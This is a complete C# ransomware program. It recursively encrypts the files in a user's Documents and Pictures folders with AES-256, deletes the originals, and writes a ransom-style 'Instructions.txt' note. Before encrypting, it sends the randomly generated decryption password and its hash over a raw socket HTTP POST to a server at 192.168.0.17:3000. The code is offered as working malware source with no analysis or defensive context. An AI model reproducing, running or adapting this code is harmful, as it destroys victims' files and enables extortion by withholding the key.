using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class Program
{
    static string GenerateRandomPassword(int length)
    {
        const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        var random = new Random();
        var chars = Enumerable.Range(0, length)
                              .Select(x => validChars[random.Next(validChars.Length)]);
        return new string(chars.ToArray());
    }

	static void Main()
	{
		string userFolderPath = Environment.GetEnvironmentVariable("USERPROFILE"); // root folder
		List<string> foldersToEncrypt = new List<string>
		{
			Path.Combine(userFolderPath, "Documents"), // folders to encrypt, more can be added
			Path.Combine(userFolderPath, "Pictures")
		};
		List<string> excludedExtensions = new List<string> { ".cs", ".exe", ".js" }; // Example excluded extensions

		bool isEncrypted = false;

		// Check if any file in the folders to encrypt is already encrypted
		foreach (var folderPath in foldersToEncrypt)
		{
			var files = Directory.GetFiles(folderPath);
			foreach (var file in files)
			{
				if (!excludedExtensions.Any(ext => file.EndsWith(ext)))
				{
					byte[] header = Encoding.UTF8.GetBytes("EncryptedFile00");
					byte[] existingHeader = new byte[header.Length];

					using (FileStream inputFile = File.OpenRead(file))
					{
						if (inputFile.Length > existingHeader.Length)
						{
							inputFile.Read(existingHeader, 0, existingHeader.Length);
							if (existingHeader.SequenceEqual(header))
							{
								isEncrypted = true;
								break;
							}
						}
					}
				}
			}

			if (isEncrypted)
				break;
		}

		if (!isEncrypted)
		{
			// Generate a random password
			string password = GenerateRandomPassword(12);

			// Send password and its hash to the server
			string hash = ComputeHash(password);
			SendPasswordToServer(password, hash);

			// Encryption process
			foreach (var folderPath in foldersToEncrypt)
			{
				string hashFilePath = Path.Combine(folderPath, "passwordHash.txt");
				File.WriteAllText(hashFilePath, hash);
				EncryptFolder(folderPath, password, hashFilePath, excludedExtensions);
				string text = Path.Combine(folderPath, "Instructions.txt");
				File.WriteAllText(text, "Your files have been encrypted, I'm happy for you or sorry it happened.");
			}
		}
		else
		{
			Console.WriteLine("Files are already encrypted. Skipping encryption process.");
		}
	}

    static string ComputeHash(string input)
    {
        using (SHA256 sha256Hash = SHA256.Create())
        {
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < bytes.Length; i++)
            {
                builder.Append(bytes[i].ToString("x2"));
            }
            return builder.ToString();
        }
    }

    static void SendPasswordToServer(string password, string hashedPassword)
    {
        string serverIP = "192.168.0.17"; // Server IP address or domain
        int port = 3000;
        string postData = "password=" + Uri.EscapeDataString(password) + "&hashedPassword=" + Uri.EscapeDataString(hashedPassword);
        string httpRequest = "POST /submit-key HTTP/1.1\r\n" +
                             "Host: " + serverIP + "\r\n" +
                             "Content-Type: application/x-www-form-urlencoded\r\n" +
                             "Content-Length: " + postData.Length + "\r\n" +
                             "Connection: close\r\n\r\n" +
                             postData;

        byte[] requestBytes = Encoding.ASCII.GetBytes(httpRequest);
        ManualResetEvent connectDone = new ManualResetEvent(false);
        ManualResetEvent sendDone = new ManualResetEvent(false);
        ManualResetEvent receiveDone = new ManualResetEvent(false);

        try
        {
            IPAddress ipAddress = IPAddress.Parse(serverIP);
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);

            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            client.BeginConnect(remoteEP, ar =>
            {
                client.EndConnect(ar);
                connectDone.Set();
            }, null);

            connectDone.WaitOne();

            client.BeginSend(requestBytes, 0, requestBytes.Length, 0, ar =>
            {
                client.EndSend(ar);
                sendDone.Set();
            }, null);

            sendDone.WaitOne();

            byte[] response = new byte[1024];
            string responseData = string.Empty;

            client.BeginReceive(response, 0, response.Length, 0, ar =>
            {
                int bytesRead = client.EndReceive(ar);
                responseData = Encoding.ASCII.GetString(response, 0, bytesRead);
                receiveDone.Set();
            }, null);

            receiveDone.WaitOne();

            Console.WriteLine("Server response: " + responseData);

            client.Shutdown(SocketShutdown.Both);
            client.Close();
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending data to server: " + ex.Message);
        }
    }

static void EncryptFolder(string folderPath, string password, string hashFilePath, List<string> excludedExtensions)
{
    try
    {
        // Encrypt files in the current folder
        var files = Directory.GetFiles(folderPath);
        foreach (var file in files)
        {
            if (file != hashFilePath && !excludedExtensions.Any(ext => file.EndsWith(ext)))
            {
                try
                {
                    EncryptFile(file, password);
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine("Access denied for file: " + file + ". Skipping...");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("An error occurred with file: " + file + ". Error: " + ex.Message);
                }
            }
        }

        // Recursively encrypt files in all subdirectories
        var subdirectories = Directory.GetDirectories(folderPath);
        foreach (var directory in subdirectories)
        {
            EncryptFolder(directory, password, hashFilePath, excludedExtensions);
        }

        Console.WriteLine("Encryption complete for folder: " + folderPath);
    }
    catch (Exception ex)
    {
        Console.WriteLine("An error occurred: " + ex.Message);
    }
}


    static void EncryptFile(string filePath, string password)
    {
    byte[] header = Encoding.UTF8.GetBytes("EncryptedFile00");
    byte[] existingHeader = new byte[header.Length];

    // Check if the file is already encrypted
    using (FileStream inputFile = File.OpenRead(filePath))
    {
        if (inputFile.Length > existingHeader.Length)
        {
            inputFile.Read(existingHeader, 0, existingHeader.Length);
            if (existingHeader.SequenceEqual(header))
            {
                Console.WriteLine("File " + filePath + " is already encrypted. Skipping...");
                return;
            }
        }
    }

    // Proceed with encryption
    byte[] salt = new byte[16];
    new RNGCryptoServiceProvider().GetBytes(salt);
    var key = new Rfc2898DeriveBytes(password, salt, 10000).GetBytes(32);

    string tempFilePath = filePath + ".tmp"; // Temporary file for encrypted content

    using (var symmetricKey = new RijndaelManaged())
    {
        symmetricKey.KeySize = 256;
        symmetricKey.BlockSize = 128;
        symmetricKey.Padding = PaddingMode.Zeros;

        using (FileStream inputFile = File.OpenRead(filePath))
        using (FileStream outputFile = File.Create(tempFilePath))
        {
            // Write header and salt to output file
            outputFile.Write(header, 0, header.Length);
            outputFile.Write(salt, 0, salt.Length);

            using (CryptoStream cryptoStream = new CryptoStream(outputFile, symmetricKey.CreateEncryptor(key, new byte[16]), CryptoStreamMode.Write))
            {
                inputFile.CopyTo(cryptoStream);
            }
        }
    }

    File.Delete(filePath); // Delete the original file
    File.Move(tempFilePath, filePath); // Replace the original file with the encrypted file
}
}